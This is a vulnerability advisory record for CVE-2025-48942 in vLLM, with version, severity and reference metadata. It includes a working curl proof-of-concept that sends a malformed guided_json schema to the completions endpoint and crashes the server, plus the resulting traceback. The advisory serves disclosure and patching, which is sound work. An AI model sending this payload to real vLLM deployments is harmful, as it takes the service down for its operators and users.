advisory_id: GHSA-6qc9-v4r8-22xg
datasource_id: github_osv_importer_v2/GHSA-6qc9-v4r8-22xg
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-6qc9-v4r8-22xg/GHSA-6qc9-v4r8-22xg.json
aliases:
  - CVE-2025-48942
summary: "vLLM DOS: Remotely kill vllm over http with invalid JSON schema\n### Summary\nHitting\
  \ the  /v1/completions API with a invalid json_schema as a Guided Param will kill the vllm\
  \ server\n\n\n### Details\nThe following API call \n`(venv) [derekh@ip-172-31-15-108 ]$ curl\
  \ -s http://localhost:8000/v1/completions -H \"Content-Type: application/json\" -d '{\"model\"\
  : \"meta-llama/Llama-3.2-3B-Instruct\",\"prompt\": \"Name two great reasons to visit Sligo\
  \ \", \"max_tokens\": 10, \"temperature\": 0.5, \"guided_json\":\"{\\\"properties\\\":{\\\"\
  reason\\\":{\\\"type\\\": \\\"stsring\\\"}}}\"}'   \n`\nwill provoke a Uncaught exceptions\
  \ from xgrammer in \n`./lib64/python3.11/site-packages/xgrammar/compiler.py\n`\n\nIssue with\
  \ more information: https://github.com/vllm-project/vllm/issues/17248\n\n### PoC\nMake a call\
  \ to vllm with invalid json_scema e.g. `{\\\"properties\\\":{\\\"reason\\\":{\\\"type\\\"\
  : \\\"stsring\\\"}}}`\n\n`curl -s http://localhost:8000/v1/completions -H \"Content-Type:\
  \ application/json\" -d '{\"model\": \"meta-llama/Llama-3.2-3B-Instruct\",\"prompt\": \"Name\
  \ two great reasons to visit Sligo \", \"max_tokens\": 10, \"temperature\": 0.5, \"guided_json\"\
  :\"{\\\"properties\\\":{\\\"reason\\\":{\\\"type\\\": \\\"stsring\\\"}}}\"}'\n`\n### Impact\n\
  vllm crashes\n\n\nexample traceback\n```\nERROR 03-26 17:25:01 [core.py:340] EngineCore hit\
  \ an exception: Traceback (most recent call last):\nERROR 03-26 17:25:01 [core.py:340]   File\
  \ \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\", line 333, in run_engine_core\nERROR\
  \ 03-26 17:25:01 [core.py:340]     engine_core.run_busy_loop()\nERROR 03-26 17:25:01 [core.py:340]\
  \   File \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\", line 367, in run_busy_loop\n\
  ERROR 03-26 17:25:01 [core.py:340]     outputs = step_fn()\nERROR 03-26 17:25:01 [core.py:340]\
  \               ^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/engine/core.py\"\
  , line 181, in step\nERROR 03-26 17:25:01 [core.py:340]     scheduler_output = self.scheduler.schedule()\n\
  ERROR 03-26 17:25:01 [core.py:340]                        ^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR\
  \ 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/core/scheduler.py\"\
  , line 257, in schedule\nERROR 03-26 17:25:01 [core.py:340]     if structured_output_req and\
  \ structured_output_req.grammar:\nERROR 03-26 17:25:01 [core.py:340]                     \
  \             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"\
  /home/derekh/workarea/vllm/vllm/v1/structured_output/request.py\", line 41, in grammar\nERROR\
  \ 03-26 17:25:01 [core.py:340]     completed = self._check_grammar_completion()\nERROR 03-26\
  \ 17:25:01 [core.py:340]                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01\
  \ [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py\"\
  , line 29, in _check_grammar_completion\nERROR 03-26 17:25:01 [core.py:340]     self._grammar\
  \ = self._grammar.result(timeout=0.0001)\nERROR 03-26 17:25:01 [core.py:340]             \
  \        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"\
  /usr/lib64/python3.11/concurrent/futures/_base.py\", line 456, in result\nERROR 03-26 17:25:01\
  \ [core.py:340]     return self.__get_result()\nERROR 03-26 17:25:01 [core.py:340]       \
  \     ^^^^^^^^^^^^^^^^^^^\nERROR 03-26 17:25:01 [core.py:340]   File \"/usr/lib64/python3.11/concurrent/futures/_base.py\"\
  , line 401, in __get_result\nERROR 03-26 17:25:01 [core.py:340]     raise self._exception\n\
  ERROR 03-26 17:25:01 [core.py:340]   File \"/usr/lib64/python3.11/concurrent/futures/thread.py\"\
  , line 58, in run\nERROR 03-26 17:25:01 [core.py:340]     result = self.fn(*self.args, **self.kwargs)\n\
  ERROR 03-26 17:25:01 [core.py:340]              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nERROR\
  \ 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/vllm/v1/structured_output/__init__.py\"\
  , line 120, in _async_create_grammar\nERROR 03-26 17:25:01 [core.py:340]     ctx = self.compiler.compile_json_schema(grammar_spec,\n\
  ERROR 03-26 17:25:01 [core.py:340]           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\
  ERROR 03-26 17:25:01 [core.py:340]   File \"/home/derekh/workarea/vllm/venv/lib64/python3.11/site-packages/xgrammar/compiler.py\"\
  , line 101, in compile_json_schema\nERROR 03-26 17:25:01 [core.py:340]     self._handle.compile_json_schema(\n\
  ERROR 03-26 17:25:01 [core.py:340] RuntimeError: [17:25:01] /project/cpp/json_schema_converter.cc:795:\
  \ Check failed: (schema.is<picojson::object>()) is false: Schema should be an object or bool\n\
  ERROR 03-26 17:25:01 [core.py:340] \nERROR 03-26 17:25:01 [core.py:340] \nCRITICAL 03-26 17:25:01\
  \ [core_client.py:269] Got fatal signal from worker processes, shutting down. See stack trace\
  \ above for root cause issue.\n```\n\n### Fix\n\n* https://github.com/vllm-project/vllm/pull/17623"
impacted_packages:
  - purl: pkg:pypi/vllm
    affected_versions: vers:pypi/>=0.8.0|<0.9.0
    fixed_versions: vers:pypi/0.9.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-6qc9-v4r8-22xg/GHSA-6qc9-v4r8-22xg.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-248
references:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-54.yaml
    reference_type:
    reference_id:
  - url: https://github.com/vllm-project/vllm
    reference_type:
    reference_id:
  - url: https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff
    reference_type:
    reference_id:
  - url: https://github.com/vllm-project/vllm/issues/17248
    reference_type:
    reference_id:
  - url: https://github.com/vllm-project/vllm/pull/17623
    reference_type:
    reference_id:
  - url: https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-48942
    reference_type:
    reference_id: CVE-2025-48942
